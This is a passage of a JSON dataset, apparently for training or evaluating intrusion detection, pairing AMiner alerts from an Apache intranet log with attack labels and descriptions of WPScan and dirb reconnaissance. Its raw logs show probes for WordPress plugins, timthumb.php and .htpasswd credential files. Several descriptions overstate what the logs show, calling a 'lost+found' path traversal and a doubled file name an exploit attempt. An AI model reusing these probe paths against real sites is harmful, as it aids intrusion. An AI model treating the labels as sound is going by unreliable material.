+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:58 +0000] \\\"HEAD /wp-content/plugins/animate-it/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508278], \"DetectionTimestamp\": [1642508278], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "New request method 'HEAD' (value '3') for '/wp-content/plugins/animated-typing-effect/' from 172.17.130.196, with User-Agent 'WPScan'. This is part of a continuous WordPress plugin enumeration, indicating an attacker is systematically probing for vulnerable plugins. The 'HEAD' method is used to check for the resource's existence without full content retrieval.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:58 +0000] \\\"HEAD /wp-content/plugins/animated-typing-effect/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508278], \"DetectionTimestamp\": [1642508278], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "Another instance of 'HEAD' request for '/wp-content/plugins/analytify-analytics-dashboard-widget/' from 172.17.130.196 by 'WPScan'. This further confirms the ongoing, automated WordPress vulnerability scan, specifically targeting analytics plugins which could be a source of data exposure or other vulnerabilities.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:58 +0000] \\\"HEAD /wp-content/plugins/analytify-analytics-dashboard-widget/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508278], \"DetectionTimestamp\": [1642508278], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "New 'HEAD' request for '/wp-content/plugins/post-snippets/' from 172.17.130.196 by 'WPScan'. This continues the pattern of systematic WordPress plugin enumeration. The attacker is trying to identify all installed plugins to discover any known vulnerabilities.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:01 +0000] \\\"HEAD /wp-content/plugins/post-snippets/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508281], \"DetectionTimestamp\": [1642508281], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "Another 'HEAD' request for '/wp-content/plugins/post-types-order/' from 172.17.130.196 by 'WPScan'. This indicates ongoing, methodical WordPress plugin enumeration. The consistency of these alerts points to a dedicated attacker leveraging WPScan to find exploitable components.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:01 +0000] \\\"HEAD /wp-content/plugins/post-types-order/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508281], \"DetectionTimestamp\": [1642508281], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "Another 'HEAD' request for '/wp-content/plugins/post-type-switcher/' from 172.17.130.196 by 'WPScan'. The pattern of repeated 'HEAD' requests to various plugin directories confirms an active and thorough WordPress vulnerability scan, aiming to identify vulnerable components for potential exploitation.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:01 +0000] \\\"HEAD /wp-content/plugins/post-type-switcher/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508281], \"DetectionTimestamp\": [1642508281], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "Another 'HEAD' request for '/wp-content/plugins/postmark-approved-wordpress-plugin/' from 172.17.130.196 by 'WPScan'. This continuous stream of 'HEAD' requests to different WordPress plugin directories highlights the systematic nature of the attacker's reconnaissance, trying to map out the installed plugins and their versions.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:01 +0000] \\\"HEAD /wp-content/plugins/postmark-approved-wordpress-plugin/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508281], \"DetectionTimestamp\": [1642508281], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "Another 'HEAD' request for '/wp-content/plugins/postie/' from 172.17.130.196 by 'WPScan'. This is part of a persistent and methodical WordPress plugin enumeration. The repeated use of WPScan for these 'HEAD' requests suggests a thorough attempt to discover all potential entry points into the WordPress installation.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:01 +0000] \\\"HEAD /wp-content/plugins/postie/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508281], \"DetectionTimestamp\": [1642508281], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "New 'HEAD' request for '/wp-content/themes/ecobiz/thumb/timthumb.php' from 172.17.130.196 by 'WPScan'. This specifically targets 'timthumb.php', a script in WordPress themes that has historically been a source of numerous vulnerabilities. This indicates the attacker is looking for specific, well-known weaknesses in themes.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:07 +0000] \\\"HEAD /wp-content/themes/ecobiz/thumb/timthumb.php HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508287], \"DetectionTimestamp\": [1642508287], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "Another 'HEAD' request for '/wp-content/themes/ecobiz//timthumb.php' (with a double slash) from 172.17.130.196 by 'WPScan'. This indicates the attacker is attempting variations of the path to 'timthumb.php', common in vulnerability scanning to bypass simple path filtering or discover misconfigurations that might expose the script.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:07 +0000] \\\"HEAD /wp-content/themes/ecobiz//timthumb.php HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508287], \"DetectionTimestamp\": [1642508287], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "Another 'HEAD' request for '/wp-content/themes/ecobiz/timthumb.phptimthumb.php' from 172.17.130.196 by 'WPScan'. This clearly shows advanced probing for 'timthumb.php' vulnerabilities, likely attempting to exploit path traversal or file inclusion issues by appending the script name. This is a strong indicator of a targeted exploit attempt against a known vulnerable component.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:07 +0000] \\\"HEAD /wp-content/themes/ecobiz/timthumb.phptimthumb.php HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508287], \"DetectionTimestamp\": [1642508287], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "New 'HEAD' request for '/wp-content/themes/eCobiz/timthumb.php' (case variation) from 172.17.130.196 by 'WPScan'. This signifies persistent and thorough vulnerability scanning. The attacker is trying different casing for the 'ecobiz' theme name to bypass case-sensitive filters and ensure comprehensive checking for the vulnerable 'timthumb.php' script.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:07 +0000] \\\"HEAD /wp-content/themes/eCobiz/timthumb.php HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508287], \"DetectionTimestamp\": [1642508287], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "New 'HEAD' request for '/wp-content/themes/ecobiz/tools/thumb/thumb.php' from 172.17.130.196 by 'WPScan'. This specific path suggests the attacker is aware of common locations for image manipulation scripts or other potentially vulnerable utilities within themes. This targeted probing for 'thumb.php' in a 'tools' directory indicates a search for known vulnerabilities.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:07 +0000] \\\"HEAD /wp-content/themes/ecobiz/tools/thumb/thumb.php HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508287], \"DetectionTimestamp\": [1642508287], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Credential Access"
+    ],
+    "attack_type": "dirb",
+    "description": "New status code '403' for a GET request to '/javascript/jquery/.htpasswd' from 172.17.130.196. An attempt to access '.htpasswd' files indicates an attacker trying to discover credentials for authentication. The 403 Forbidden response is positive, but the attempt itself is malicious.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP",
+      "credential scrapers"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 4, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New status code in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_status_code\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/status_code\"], \"AffectedLogAtomValues\": [\"403\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:19:34 +0000] \\\"GET /javascript/jquery/.htpasswd HTTP/1.1\\\" 403 366 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642508374], \"DetectionTimestamp\": [1642508374], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Credential Access"
+    ],
+    "attack_type": "dirb",
+    "description": "New status code '403' for a GET request to '/javascript/jquery/.htpasswd_' from 172.17.130.196. This is a variation of the previous attempt to access a '.htpasswd' file, likely trying to bypass security controls or discover backups/misconfigured credential files. This further confirms an attacker's intent to gain unauthorized access.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP",
+      "credential scrapers"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 4, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New status code in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_status_code\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/status_code\"], \"AffectedLogAtomValues\": [\"403\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:19:34 +0000] \\\"GET /javascript/jquery/.htpasswd_ HTTP/1.1\\\" 403 366 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642508374], \"DetectionTimestamp\": [1642508374], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Directory Traversal"
+    ],
+    "attack_type": "dirb",
+    "description": "New character '@' detected in Apache Access request to '/javascript/jquery/@' from 172.17.130.196. The '@' symbol can be used in attempts to bypass security filters, access internal paths (e.g., using '@' for special meaning in some web servers), or probe for directory traversal vulnerabilities. This indicates an unusual and potentially malicious request.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/javascript/jquery/@\"], \"MissingCharacters\": [\"@\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:19:34 +0000] \\\"GET /javascript/jquery/@ HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642508374], \"DetectionTimestamp\": [1642508374], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Directory Traversal"
+    ],
+    "attack_type": "dirb",
+    "description": "New character '~' detected in Apache Access request to '/javascript/jquery/~adm' from 172.17.130.196. The '~' (tilde) character is often used in web server contexts to refer to user home directories or to bypass directory restrictions (e.g., '~username' for a user's web space). This strongly suggests an attacker is probing for sensitive directories or attempting directory traversal.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/javascript/jquery/~adm\"], \"MissingCharacters\": [\"~\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:19:34 +0000] \\\"GET /javascript/jquery/~adm HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642508374], \"DetectionTimestamp\": [1642508374], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "dirb",
+    "description": "New event type: 'script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/info.php' not found or unable to stat' from 172.17.130.196. This indicates an attempt to access a non-existent PHP file within the WordPress sitemaps directory, likely a reconnaissance attempt to discover information disclosure vulnerabilities or common backdoor locations. The name 'info.php' is suggestive of a script that could reveal server configuration.",
+    "tools": [
+      "WPScan",
+      "dirbuster"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/script\", \"/model/with_data/fm/client/fm/script/script_str\", \"/model/with_data/fm/client/fm/script/script_path\", \"/model/with_data/fm/client/fm/script/msg\", \"/model/with_data/fm/client/fm/script/referer\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:23:55.653451 2022] [php7:error] [pid 28492] [client 172.17.130.196:57584] script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/info.php' not found or unable to stat\"], \"Timestamps\": [1642508635.65], \"DetectionTimestamp\": [1642508635.65], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Directory Traversal"
+    ],
+    "attack_type": "dirb",
+    "description": "New character '+' detected in Apache Access request to '/wp-includes/sitemaps/lost+found' from 172.17.130.196. The '+' character in a URL can be a space indicator, but its presence in a 'lost+found' path, especially within a WordPress directory, suggests an attacker is trying to exploit path traversal or file inclusion vulnerabilities, possibly looking for misconfigured or exposed files.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-includes/sitemaps/lost+found\"], \"MissingCharacters\": [\"+\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:23:56 +0000] \\\"GET /wp-includes/sitemaps/lost+found HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642508636], \"DetectionTimestamp\": [1642508636], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "dirb",
+    "description": "New event type: 'script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/phpinfo.php' not found or unable to stat' from 172.17.130.196. This is a very strong indicator of vulnerability scanning, specifically looking for 'phpinfo.php' files, which are commonly used to expose extensive server configuration and PHP environment details. An attacker would use this information for further exploitation.",
+    "tools": [
+      "WPScan",
+      "dirbuster"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/script\", \"/model/with_data/fm/client/fm/script/script_str\", \"/model/with_data/fm/client/fm/script/script_path\", \"/model/with_data/fm/client/fm/script/msg\", \"/model/with_data/fm/client/fm/script/referer\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:23:57.925993 2022] [php7:error] [pid 28495] [client 172.17.130.196:57602] script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/phpinfo.php' not found or unable to stat\"], \"Timestamps\": [1642508637.93], \"DetectionTimestamp\": [1642508637.93], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Directory Traversal"
+    ],
+    "attack_type": "dirb",
+    "description": "New character '~' detected in Apache Access request to '/wp-includes/js/thickbox/~webmaster' from 172.17.130.196. Similar to previous tilde attempts, this indicates an attacker is probing for user home directories or administrative paths within WordPress, specifically targeting JavaScript libraries like Thickbox, which might have associated files or misconfigurations.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-includes/js/thickbox/~webmaster\"], \"MissingCharacters\": [\"~\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:31:21 +0000] \\\"GET /wp-includes/js/thickbox/~webmaster HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509081], \"DetectionTimestamp\": [1642509081], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Path Traversal",
+      "Information Gathering"
+    ],
+    "attack_type": "dirb",
+    "description": "Unusual character '~' in URL suggests an attempt to bypass directory restrictions or explore directory contents. This could be an attempt to access restricted files or perform directory listing.",
+    "tools": [
+      "Wget",
+      "Curl",
+      "Nikto"
+    ],
